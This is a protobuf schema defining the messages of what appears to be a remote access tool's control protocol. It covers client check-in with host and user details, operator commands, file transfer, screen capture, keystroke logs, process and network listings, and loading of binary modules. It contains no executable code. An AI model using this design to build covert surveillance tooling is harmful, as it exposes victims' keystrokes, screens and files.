syntax = "proto3";

package miau;

import "enums.proto";

message Envelope {
    uint32           version    = 1;
    string           token      = 2;
    uint64           seq        = 3;
    uint64           timestamp  = 4;
    PacketType       packet_type = 5;
    bytes            nonce      = 6;
    bytes            payload    = 7;
}

message ClientAuth {
    string           token       = 1;
    string           hostname    = 2;
    string           username    = 3;
    string           os          = 4;
    string           arch        = 5;
    string           client_ver = 6;
    string           install_id  = 7;
}

message AuthAck {
    bool             accepted    = 1;
    string           reason      = 2;
    uint32           hb_interval = 3;
}

message Heartbeat {
    uint32           cpu       = 1;
    uint32           ram_used  = 2;
    uint32           ram_total = 3;
    string           pub_ip    = 4;
    string           priv_ip   = 5;
    uint64           uptime    = 6;
}

message Command {
    uint64           id        = 1;
    CommandType      cmd_type  = 2;
    string           args      = 3;
    bytes            blob      = 4;
    uint32           timeout   = 5;
}

message Response {
    uint64           id        = 1;
    ResponseStatus   status    = 2;
    string           message   = 3;
    bytes            data      = 4;
    bool             final     = 5;
}

message FileEntry {
    string           path      = 1;
    uint64           size      = 2;
    bool             is_dir    = 3;
    int64            modified  = 4;
}

message FileList {
    string           base      = 1;
    repeated FileEntry entries = 2;
}

message FileChunk {
    string           path      = 1;
    uint64           offset    = 2;
    bytes            data      = 3;
    bool             last      = 4;
}

message ScreenFrame {
    uint32           width     = 1;
    uint32           height    = 2;
    bytes            jpeg      = 3;
    uint32           fps       = 4;
}

message KeyLog {
    string           window    = 1;
    string           text      = 2;
    int64            ts        = 3;
}

message ProcessEntry {
    uint32           pid       = 1;
    string           name      = 2;
    string           path      = 3;
    uint32           cpu       = 4;
    uint64           mem       = 5;
}

message ProcessList {
    repeated ProcessEntry entries = 1;
}

message NetEntry {
    string           proto     = 1;
    string           local     = 2;
    string           remote    = 3;
    string           state     = 4;
    uint32           pid       = 5;
}

message NetList {
    repeated NetEntry entries = 1;
}

message ModuleHeader {
    string           name      = 1;
    string           version   = 2;
    bytes            binary    = 3;
    string           entry     = 4;
}

message SysInfo {
    string           hostname  = 1;
    string           os        = 2;
    string           arch      = 3;
    string           cpu_name  = 4;
    uint32           cpu_cores = 5;
    uint64           ram_total = 6;
    string           gpu       = 7;
    string           pub_ip    = 8;
    string           priv_ip   = 9;
    string           timezone  = 10;
    uint64           uptime    = 11;
}

message ClientEvent {
    string           kind      = 1;
    string           detail    = 2;
    int64            ts        = 3;
}
